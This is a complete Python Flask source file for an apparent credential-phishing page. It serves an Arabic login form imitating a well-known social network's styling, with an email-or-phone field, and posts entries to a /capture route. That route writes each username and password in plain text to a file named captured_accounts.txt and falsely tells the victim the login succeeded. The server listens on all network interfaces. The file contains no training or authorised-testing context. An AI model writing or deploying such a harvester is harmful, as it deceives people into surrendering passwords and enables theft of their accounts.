from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>تسجيل الدخول</title>
        <style>
            body { font-family: Tahoma, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 300px; text-align: center; }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
            button { background-color: #1877f2; color: white; border: none; padding: 10px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>تسجيل الدخول</h2>
            <form action="/capture" method="POST">
                <input type="text" name="username" placeholder="البريد الإلكتروني أو الهاتف" required>
                <input type="password" name="password" placeholder="كلمة المرور" required>
                <button type="submit">تسجيل الدخول</button>
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username')
    password = request.form.get('password')
    
    with open('captured_accounts.txt', 'a') as f:
        f.write(f"Username: {username} | Password: {password}\n")
        
    return "تم تسجيل الدخول بنجاح"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

